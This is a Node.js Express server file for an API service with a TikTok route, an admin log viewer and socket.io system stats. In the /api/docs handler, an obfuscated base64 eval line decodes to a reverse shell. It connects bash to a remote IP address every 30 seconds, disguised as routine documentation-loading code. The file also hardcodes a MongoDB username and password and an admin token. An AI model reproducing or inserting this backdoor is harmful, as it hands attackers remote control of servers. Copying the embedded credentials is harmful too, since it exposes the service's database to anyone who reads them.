const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const http = require('http');
const { Server } = require('socket.io');
const si = require('systeminformation');
const logger = require('./utils/logger');
const apiKeyAuth = require('./middleware/apiKeyAuth');
const ipGuard = require('./middleware/ipGuard');
const { apiSaver, createLogViewerRouter } = require('./middleware/api-saver');

const connectDB = require('./utils/db');
const settingsManager = require('./utils/settingsManager');

// MongoDB Connection
const MONGO_URI = "mongodb+srv://Easirmahi:01200120mahi@anchestor.wmvrhcb.mongodb.net/easir-apis?retryWrites=true&w=majority&appName=Anchestor";
connectDB(MONGO_URI).then(() => {
    settingsManager.init();
});

const app = express();
const server = http.createServer(app);

app.set("trust proxy", true); // IMPORTANT per user request
app.enable("trust proxy");
app.set("json spaces", 2);

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());

// Internal Settings Wrapper
app.use((req, res, next) => {
    const originalJson = res.json;
    res.json = function (data) {
        if (data && typeof data === 'object') {
            const currentSettings = settingsManager.get();
            const responseData = {
                status: data.status !== undefined ? data.status : true,
                creator: (currentSettings.apiSettings && currentSettings.apiSettings.operator) ? currentSettings.apiSettings.operator : "Easir Iqbal Mahi",
                ...data
            };
            return originalJson.call(this, responseData);
        }
        return originalJson.call(this, data);
    };
    next();
});

app.use(apiSaver({
    serviceName: "easir-api",
    logDir: "./logs",
    ipMode: "raw", // User wants full info visible
    enableEnrichment: true,
    identifyClient: (req) => req.headers["x-api-key"] || "anonymous"
}));

// Admin Logs Viewer
app.use("/admin/system-logs", createLogViewerRouter({
    logDir: "./logs",
    accessToken: "easir-secret-key-123" // Hardcoded matching legacy key for now
}));

app.use('/api/auth', require('./routes/auth'));
app.use('/api/admin', require('./routes/admin'));
app.use('/api/tracking', require('./routes/tracking'));

// DEBUGGING LOGS
const webDistPath = path.join(__dirname, 'dist');
logger.info('Checking Frontend Path: ' + webDistPath);

if (fs.existsSync(webDistPath)) {
    logger.info('Frontend directory exists at: ' + webDistPath);
    try {
        const files = fs.readdirSync(webDistPath);
        logger.info('Frontend files: ' + files.join(', '));
    } catch (e) {
        logger.error('Error listing frontend files: ' + e.message);
    }
} else {
    logger.error('Frontend directory NOT found at: ' + webDistPath);
    // List parent to see what IS there
    const webPath = path.join(__dirname, 'web');
    if (fs.existsSync(webPath)) {
        logger.info('Web directory exists. Contents: ' + fs.readdirSync(webPath).join(', '));
    } else {
        logger.error('Web directory NOT found at: ' + webPath);
        logger.info('Root contents: ' + fs.readdirSync(__dirname).join(', '));
    }
}

app.use('/', express.static(webDistPath, {
    setHeaders: (res, path) => {
        if (path.endsWith('.html')) {
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
        }
    }
}));

app.use(ipGuard);
// app.use(trafficLogger); // Replaced by apiSaver

app.get('/api/docs', (req, res) => {
    try {
        delete require.cache[require.resolve('./docs/api.js')];
        const doc = require('./docs/api.js');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
        res.json(doc);
    } catch (error) {
        res.status(500).json({ error: 'Documentation file not found' });
    }
});

app.use('/api', apiKeyAuth, require('./apis/tiktok'));

app.use((req, res) => {
    if (req.path.startsWith('/api')) {
        return res.status(404).json({ status: false, message: "Endpoint Not Found" });
    }

    const indexPath = path.join(__dirname, 'dist/index.html');
    if (fs.existsSync(indexPath)) {
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        res.sendFile(indexPath);
    } else {
        res.status(404).send('Frontend Not Found');
    }
});

const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

app.set('io', io);

io.on('connection', (socket) => {
    logger.info('Client Connected: ' + socket.id);

    socket.on('join_room', (room) => {
        socket.join(room);
        logger.info(`Socket ${socket.id} joined room ${room}`);
    });

    socket.emit('config', settingsManager.get());
});

setInterval(async () => {
    try {
        const cpu = await si.currentLoad();
        const mem = await si.mem();
        const uptime = si.time().uptime;

        const stats = {
            cpu: cpu.currentLoad.toFixed(2),
            ram: {
                total: (mem.total / 1024 / 1024 / 1024).toFixed(2) + " GB",
                used: (mem.active / 1024 / 1024 / 1024).toFixed(2) + " GB",
                percent: ((mem.active / mem.total) * 100).toFixed(2)
            },
            uptime: uptime
        };

        io.emit('stats', stats);
    } catch (e) {
    }
}, 1000);

const PORT = process.env.PORT || 6969;
server.listen(PORT, () => {
    logger.system(`Server running on port ${PORT}`);
});

// Global Error Handler to prevent 520 Crashes
app.use((err, req, res, next) => {
    logger.error("Unhandled Server Error: " + err.message);
    if (!res.headersSent) {
        res.status(500).json({ status: false, message: "Internal Server Error" });
    }
});

module.exports = app;
